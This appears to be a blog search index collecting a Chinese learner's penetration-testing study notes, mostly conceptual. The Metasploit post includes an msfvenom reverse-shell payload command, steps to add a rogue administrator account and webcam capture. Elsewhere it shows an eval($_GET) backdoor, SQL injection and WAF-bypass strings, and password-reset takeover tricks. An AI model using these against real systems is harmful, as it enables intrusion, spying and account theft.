<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>建立属于你自己的博客</title>
      <link href="/2022/04/06/jian-li-shu-yu-ni-zi-ji-de-bo-ke/"/>
      <url>/2022/04/06/jian-li-shu-yu-ni-zi-ji-de-bo-ke/</url>
      
        <content type="html"><![CDATA[<p>这个博客建立的可谓历经坎坷，但功夫不负有心人，终归是建立好了，我不啰嗦，直接上链接。</p><p>1.开始建博客同步到github上看这两个足够了。</p><p><a href="https://www.bilibili.com/video/BV1mU4y1j72n?p=1&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=9905aff1-65c9-46d9-b5ec-6b11b27c18cc&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1630328278&amp;unique_k=gS5gKJ">https://www.bilibili.com/video/BV1mU4y1j72n?p=1&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=9905aff1-65c9-46d9-b5ec-6b11b27c18cc&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1630328278&amp;unique_k=gS5gKJ</a></p><p><a href="https://sunhwee.com/posts/6e8839eb.html#toc-heading-15">https://sunhwee.com/posts/6e8839eb.html#toc-heading-15</a></p><p>2.然后我的博客主题是根据这个人的设置的，他的文章每一步非常清晰。</p><p><a href="https://www.cnblogs.com/mfrank/p/12830097.html#autoid-0-2-0aa">https://www.cnblogs.com/mfrank/p/12830097.html#autoid-0-2-0aa</a></p><p>3.购买域名：<a href="https://www.namesilo.com/">https://www.namesilo.com/</a></p><p>4.申请CloudFlare免费DNS服务：<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p><p>可能有一处出现错误就可能搭建不成功或者域名设置不成功，域名的一些设置可以在百度多看几篇文章。Over.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>基础知识</title>
      <link href="/2022/04/06/ji-chu-zhi-shi/"/>
      <url>/2022/04/06/ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p>1.查看端口，杀进程。</p><p>netstat -ano | findstr “port”<br>tasklist | findstr “9327”  当前端口号<br>taskkill &#x2F;f &#x2F;t &#x2F;im 1.exe</p><p>2.linux</p><p>rm -rf<br>ls -la<br>mkdir<br>cd &#x2F;home   cd ~ #切换到当前用户目录  cd .. #返回上一级目录   cd &#x2F; #切换到根目录<br>pwd #打印当前工作目录<br>mkdir dir1 dir2<br>touch<br>cat<br>echo #默认把内容显示到终端上<br>gzip filename<br>tar -xzvf filename.tar.gz<br>grep :强大的文本搜索工具<br>grep -n i file1 在file1中查找包含字符串i的行<br>ps -aux 显示瞬间进程状态<br>yum -y install<br>chmod 777 file  r&#x3D;4，w&#x3D;2，x&#x3D;1</p><p>3.端口状态</p><p>open：端口是开放的。<br>closed：端口是关闭的。<br>filtered：端口被防火墙IDS&#x2F;IPS屏蔽，无法确定其状态。<br>unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。<br>open|filtered：端口是开放的或被屏蔽。<br>closed|filtered ：端口是关闭的或被屏蔽。<br>报出服务名字是tcpwrapped，这说明tcp三次握手已经完成，但是并没有和目标主机建立连接。当大量的端口服务都为tcpwrapped时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。</p><p>4.搜集源码<br>1.&#x2F;.git&#x2F;<br>2.&#x2F;.svn<br>3.&#x2F;.DS_Store   Mac<br>4.&#x2F;Composer.json  php特性<br>5.github泄露</p><p>5.网页搜索</p><p>inurl:     url中存在关键字的网页<br>site:       指定域名<br>intext     网页正文中的关键字<br>“site:edu.cn intext:后台管理”</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>msf</title>
      <link href="/2022/04/06/msf/"/>
      <url>/2022/04/06/msf/</url>
      
        <content type="html"><![CDATA[<p>1.进入msf框架 搜索ms17_010<br>2.扫描靶机：使用模块 设置目标ip 执行扫描<br>3.攻击靶机：使用模块 设置目标ip 查看选项设置 执行攻击<br>4.直接拿到shell，execute -i -f cmd<br>5.创建新用户 root<br>net user root 123456 &#x2F;add<br>将用户 root 添加至管理员组<br>net localgroup administrators root &#x2F;add<br>6.截图 screenshot   拍照 webcam_snap 直播 webcam_stream 进入shell</p><p>用MSF生成远控马，msf的payload中能建立反弹shell的，比如reverse_tcp，LHOST参数（LHOST就是Local host的意思）是攻击方的IP地址，用来监听对方的连接的。其实很好理解，反弹shell嘛，就是建立反弹连接的，当然是反弹到攻击主机了。本机ip 端口 Local host 相反的是rhost<br>msfvenom -a x64 –platform windows  -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp  LHOST&#x3D;192.168.42.49 LPORT&#x3D;4444  -i 3 -f exe -o payload_test.exe</p><p>前端：页面显示  后端：信息处理</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2022/04/06/xin-xi-shou-ji/"/>
      <url>/2022/04/06/xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<p>1.收集域名信息<br>2.google收集敏感信息<br>3.收集子域名信息 子域名挖掘机 在线<br>4.收集常用端口信息 nmap masscan<br>5.指纹识别  cms (整站系统，文章系统)和web容器<br>6.查找真实ip  cdn 内容分发网络 因传输距离远设置的节点服务器<br>cdn 绕过 邮箱 邮件服务器域名ip<br>国外访问<br>域名ip历史记录<br>通过app找ip<br>7.收集敏感目录文件<br>8.社工<br>9.源码</p><p>二.相关基础知识</p><p>1.操作系统：nmap -O ip 识别操作系统<br>nmap -sV -O ip     -O:激活系统探测 -sV探测开放端口服务信息。<br>nmap -P0 ip 禁ping<br>nmap -v -n -A ip -v 详细输出 -n:表示不对目标做dns解析。-A：系统探测，版本检测，脚本扫描，路由追踪。<br>2.web：一.网站源码：cms   二.搭建平台：中间件安全     三.数据库<br>asp+access     php+mysql    aspx+mssql    jsp+mssql,oracle    python+mongodb<br>phpstudy  &#x2F;phpmyadmin<br>asp access mssql  php mysql   aspx mssql   jsp mssql,oracle<br>3.app<br>4.第三方：openssh  weblogic  jboss  redis  werv-u</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web漏洞总结</title>
      <link href="/2022/04/06/web-lou-dong-zong-jie/"/>
      <url>/2022/04/06/web-lou-dong-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="ONE-sql注入"><a href="#ONE-sql注入" class="headerlink" title="ONE:sql注入"></a>ONE:sql注入</h1><p>一．sql注入<br>1.sql注入产生原因原理：可控变量带入数据库查询，变量没有过滤或者过滤不严谨。<br>也就是页面信息和数据库产生交互。<br>2.按注入点：数字型  字符型 ‘ “  搜索型 %  %<br>编码型： 数据以编码值传递<br>加密型 数据以加密的密文发送  格式型 JSON     –+ #<br>二.按数据提交类型<br>GET  POST  Cookie  HTTP 头部:User-Agent、referer<br>三.执行效果<br>1.布尔盲注 时间盲注 报错盲注 堆查询 宽字节<br>2.宽字节：宽字节绕过:%df占用两个字节 乱码 如中文 使\不能出现。<br>（因为系统可能会自动添加)   id&#x3D;1%df’ order by 111<br>3.判断注入点：id&#x3D;1ajsdkjgj  错误，有注入点。<br>4.找注入点  注入点权限   是否是数据库管理员  –isdba<br>5.数据库类型<br>6.信息收集：操作系统，数据库，数据库版本信息收集： 操作系统： @@version_compile_so    version()  database()  user()<br>7.低版本：联合注入： order by x  挨个试  列 (猜解列名数量)    union select 1,2,3,4,x       id&#x3D;-1 看一下报错。哪里报错在哪里开始写查询信息。<br>8.高版本：在mysql5.0以上，存在一个自带数据库名：informaton_schema,存储所有数据库名，表名，列名信息。猜数据库 select schema_name from information_schema.schemata<br>mysql<br>1.低权限：常规注入<br>2.高权限：常规，文件读取：load_file  ,文件写入：into outfile<br>三．Waf绕过<br>安全狗绕过：伪造成百度爬虫，对hearder头进行设置，user-agent&#x3D;”baidu…”就是白名单的形式。<br>Sqlmap对waf绕过<br>编码防注入：–tamper&#x3D;base64encode.py<br>阿里云盾防sql注入  “union”替换”%23a%0aunion”等形式<br>如：–tamper&#x3D;rdog.py –random-agent –tables</p><h1 id="TOW-XSS"><a href="#TOW-XSS" class="headerlink" title="TOW:XSS"></a>TOW:XSS</h1><p>文件上传原理：对上传内容，过程没有过滤或过滤不完整<br>sql注入原理：可控变量带入数据库进行查询，变量没有过滤或者过滤不完全。<br>xss 原理：对输入输出没有进行严格的过滤，在页面执行js客户端脚本。   test.php？x&#x3D;&lt;&gt;alert(1)&lt;&#x2F;&gt;  可以控制页面的内容，对输入输出过滤不严格。<br>鸡肋：浏览器内核版本可以决定js脚本的执行。<br>分类：反射，存储，dom  反射和存储是发现不了的源代码的。<br>存储型：是存储在数据库的，留言板。持久攻击。<br>html Dom：查看更多，操作html代码。<br>反射<br>发包 x&#x3D;xiaodi &#x3D;&gt; x.php &#x3D;&gt;回包<br>存储型<br>发包 x&#x3D;xiaodi &#x3D;&gt; x.php &#x3D;&gt; 数据库 &#x3D;&gt;x.php&#x3D;&gt;回包<br>dom<br>发包 x&#x3D;xiaodi &#x3D;&gt;本地浏览器静态前端代码 &#x3D;&gt; x.php &#x3D;&gt;回包  可以代码分析，发现xss的。可以看到源代码。</p><p>条件 1.漏洞2.管理员登录3.浏览器没有拦截4.http only<br>cookie:存储本地，存活时间长 小中型<br>session 会话 存储服务器 存活时间短 大型 金融</p><h1 id="THREE-文件上传"><a href="#THREE-文件上传" class="headerlink" title="THREE:文件上传"></a>THREE:文件上传</h1><p>一．解析漏洞<br>1.iis 6.0  *.asp;xxx.jpg 此文件会被解析为asp执行</p><p>2.Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析,就再往左判断。 test2.php.jpg<br>3.Nginx:对于任意文件名，在后面添加&#x2F;xxx.php(xxx为任意字符)，即可将文件作为php解析。<br>二．cms漏洞<br>三．编辑器漏洞<br>四．Cve漏洞<br>五．文件上传思路<br>1.常规类：1.扫描获取上传2.会员中心上传3.后台系统4.各种途径<br>2.Cms:cms源码  通达OA cms<br>3.编辑器类：1.cheditor2.fckeditor3.kindeditor4.xxxeditor<br>4.Cve:代码审计，三方应用</p><h1 id="FORE-rce漏洞"><a href="#FORE-rce漏洞" class="headerlink" title="FORE:rce漏洞"></a>FORE:rce漏洞</h1><p>漏洞形成原因：可控变量，函数漏洞。<br>命令执行漏洞和代码执行漏洞：<br>root@ae63a3df5e26:&#x2F;var&#x2F;www&#x2F;html# cat test.php<br><?php        $code=$_GET['a'];        eval($code);?><br>ip&#x2F;test.php?a&#x3D;phpinfo();</p><p>防御：敏感函数禁用，变量固定，waf</p><p>poc验证漏洞是否存在  exp是漏洞利用代码<br>一句话菜刀原理：远程命令执行相似 把函数功能嵌套到程序里面。</p><h1 id="FIVE-目录遍历"><a href="#FIVE-目录遍历" class="headerlink" title="FIVE:目录遍历"></a>FIVE:目录遍历</h1><p>目录遍历漏洞原理比较简单，就是程序在实现上没有充分过滤用户输入的…&#x2F;之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。这里的目录跳转符可以是…&#x2F;，也可是…&#x2F;的ASCII编码或者是unicode编码等。</p><h1 id="SIX-文件包含"><a href="#SIX-文件包含" class="headerlink" title="SIX:文件包含"></a>SIX:文件包含</h1><p>通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。<br>本地文件包含：绕过：.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;    …………………………………………………..         windows 大于256<br>远程文件包含：绕过：?   %20    %23<br>无限制的文件包含漏洞：<br>root@f3d91c74e2ee:&#x2F;var&#x2F;www&#x2F;html# cat include.php<br>&lt;?php</p><p>$filename&#x3D;$_GET[‘filename’];<br>include ( $filename);</p><p>&#x2F;&#x2F;<a href="http://127.0.0.1:8080/include.php?filename=index.txt">http://127.0.0.1:8080/include.php?filename=index.txt</a><br>&#x2F;*<br>$filename&#x3D;$_GET[‘filename’];<br>include ( $filename .” .html” );<br>*&#x2F;</p><p>?&gt;</p><p>index.txt:<br><?php    phpinfo();?><br>访问ip&#x2F;include.php?filename&#x3D;index.txt</p><h1 id="SEVEN-文件下载"><a href="#SEVEN-文件下载" class="headerlink" title="SEVEN:文件下载"></a>SEVEN:文件下载</h1><p>read.xxx?filename&#x3D;<br>down.xxx?filename&#x3D;<br>readfile.xxx?file&#x3D;<br>downfile.xxx?file&#x3D;<br>..&#x2F; ..\ .\ .&#x2F;等<br>&amp;readpath&#x3D;、&amp;filepath&#x3D;、&amp;path&#x3D;、&amp;inputfile&#x3D;、&amp;url&#x3D;、&amp;data&#x3D;、&amp;readfile&#x3D;、&amp;menu&#x3D;、META-INF&#x3D;<br>文件下载中..&#x2F;的使用</p><h1 id="EIGHT-DDos"><a href="#EIGHT-DDos" class="headerlink" title="EIGHT:DDos"></a>EIGHT:DDos</h1><p>1.定义：分布式拒绝服务攻击(英文意思是Distributed Denial of Service，简称DDoS)是指处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击。由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击。<br>2.它产生的原因就是大量的攻击者洪水般访问目标网站，从而使网站无法对用户服务进行响应。<br>3.产生条件：需要大量的肉鸡，也就是傀儡机。<br>4.DDoS攻击流程<br>1.信息搜集<br>被攻击目标主机数目、地址情况<br>目标主机的配置、性能<br>目标的带宽<br>2.占领傀儡机<br>黑客最感兴趣的是有下列情况的主机：<br>链路状态好的主机<br>性能好的主机<br>安全管理水平差的主机</p><h1 id="NINE-csrf-ssrf"><a href="#NINE-csrf-ssrf" class="headerlink" title="NINE:csrf ssrf"></a>NINE:csrf ssrf</h1><p>1..CSRF（Cross-site request forgery），中文名称：跨站请求伪造<br>攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p><p>2.SSRF(Server-Side Request Forgery:服务器端请求伪造):从其他服务器应用获取数据的功能,     利用有缺陷的web应用作为跳板攻击远程和内网的服务器。a可以访问b，b可以访问c，但是a不可以访问c.<br>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p><h1 id="TEN-逻辑漏洞："><a href="#TEN-逻辑漏洞：" class="headerlink" title="TEN:逻辑漏洞："></a>TEN:逻辑漏洞：</h1><p>1.登录点暴力破解<br>2.http和https 只有知道加密方式才可以进行爆破<br>3.  cookie脆弱<br>4.支付：数量负数，超过int值。更改订单编号，购买价格，修改商品信息：编号，名字、更改支付接口：微信，支付宝，自己的支付接口，支付状态，优惠券。<br>二.找回密码<br>找回密码：找回重置机制：客户端回显 resp状态码，验证码爆破，找回流程绕过。<br>接口调用乱用：短信轰炸，来电轰炸。<br>修改账号密码：到重置密码页面不提交，抓包修改手机号后进行重置密码操作。已达到登录别人账号的操作<br>客户端：在浏览器里可以看到验证码2.抓包里面显示<br>resp状态码：可以是1,0来判断正确错误  do 模块  前端验证而不是数据库验证<br>爆破验证码<br>接口安全：短信轰炸，来电轰炸。</p><p>挖 功能点 参数<br>一.业务逻辑漏洞<br>支付：数量负数，超过int值。更改订单编号，购买价格，修改商品信息：编号，名字、更改支付接口：微信，支付宝，自己的支付接口，支付状态，优惠券。<br>二.用户身份：<br>暴力破解，密码找回:前端验证，短信轰炸，验证码爆破。cookie,session.<br>三验证码绕过：<br>验证码复用，后端没有对验证码进行销毁<br>前端，验证码一次正确，之后验证码不检测了。 发送60秒一次<br>token 替换爆破（需要一些设置） 前提：res包有token回显  密码和token值的爆破<br>四.接口<br>水平越权  wang uid&#x3D;10  设置为1-1000爆破<br>callback 跨站   spi爬虫 批量查询功能点如：id</p><h1 id="ELEVEN-中间件"><a href="#ELEVEN-中间件" class="headerlink" title="ELEVEN:中间件"></a>ELEVEN:中间件</h1><p>常见中间件：iis,tomcat,apache,nginx,jboss,weblogic.</p><p>IIS是Windows操作系统，而Tomcat是JSP语言环境，其实它也是Apache旗下的一种，不过开发环境不一样。一般Apache主要是Linux操作系统中使用较多。Nginx 是一个高性能的HTTP和反向代理服务，也是一个IMAP&#x2F;POP3&#x2F;SMTP服务。它以稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。<br>中间件利用<br>1.一般本地开发的话，小项目，或者是个人开发建议使用tomcat。<br>2.linux系统建议使用jetty或apache httpd<br>3.大型的项目就用JBOSS或webloigc</p><p>4.大项目或者商业项目一般采用：weblgoic&#x2F;webshere，其他的还有jboss、glasshfish等<br>5.一些示例项目或者小项目常采用jetty</p><p>web中间件用于提供系统软件和应用软件之间的连接，以便于软件各部件之间的沟通，其可以为一种或多种应用程序提供容器。<br>中间件是位于操作系统和应用软件之间的通用服务<br>web容器用于给处于其中的应用程序组件（JSP，SERVLET）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。<br>web中间件与web服务器是有重叠的，原因在于tomcat等web中间件也具备web服务器的功能。 </p><p>内容管理系统（content management system，CMS），是一种位于WEB前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。如OA</p><p>web：一.网站源码：cms   二.搭建平台：中间件安全     三.数据库<br>asp+access     php+mysql    aspx+mssql    jsp+mssql,oracle    python+mongodb</p><p>别人浏览你的asp页面是先发送请求到你的服务器 然后你的服务器就把通过IIS解析后的页面 返回给请求者<br>asp           iis+access<br>aspx          iis+mssql<br>Servlet（Server Applet）是Java Servlet的简称，称为小服务程序或服务连接器，用Java编写的服务器端程序，具有独立于平台和协议的特性，主要功能在于交互式地浏览和生成数据，生成动态Web内容。<br>tomcat      支持servlet,jsp</p><p>Payload是黑客用来与被黑了的系统交互的简单脚本，指成功exploit之后，真正在目标系统执行的代码或指令。<br>exp:漏洞利用程序或代码。<br>poc:漏洞验证程序<br>为了开发一个动态网站出来，有3中选择<br>1、ASP.NET<br>ASP.NET 的开发框架是 Windows server +IIS+SQL Server+ASP的组合，主要开发语言有C#.NET和VB.NET。<br>2、J2EE开发平台<br>J2EE的开发架构是 UNIX&#x2F;windows+Tomcat+Orecle+JSP的组合，主要是用JAVA编写程序。比如Android平台级应用的网页后台用户管理端<br>3、LAMP开发平台<br>LAMP的开发架构是 Linux+Apache+MySQL+PHP，主要是用PHP来编写程序。比如Facebook</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cdn绕过</title>
      <link href="/2022/04/06/cdn-rao-guo/"/>
      <url>/2022/04/06/cdn-rao-guo/</url>
      
        <content type="html"><![CDATA[<p>1.从子域名查询入手  www. 和无www.<br>2.邮件服务，邮箱服务：一般无CDN,正反向的不同<br>3.国外地址请求<br>4.遗留文件：phpinfo.php 扫描全站：同地区可能无cdn<br>5.黑暗引擎： MD5 hash<br>6.dns历史记录<br>7.m.手机访问网站  .ico图标</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
